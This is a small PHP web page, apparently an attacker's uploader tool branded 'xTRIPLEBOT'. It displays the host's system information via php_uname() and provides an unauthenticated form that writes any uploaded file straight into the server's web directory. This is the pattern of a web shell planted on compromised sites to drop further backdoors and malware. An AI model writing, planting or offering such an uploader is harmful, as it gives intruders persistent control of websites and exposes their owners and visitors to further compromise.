<html>
    <head>
        <title>Uploader By xTRIPLE_D</title>
	</head>
<body>
<br>
<br>
<br>
<br>
<br>
<br>
<br><br>
<?php
$om= "xTRIPLE";
$ar= "BOT";
$atx = $om.$ar;
echo $atx;
echo "<font color='RED'</font><center><h1>$atx</h1></center>";
echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
if( $_POST['_upl'] == "Upload" ) { 
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
} 
?>
</html>
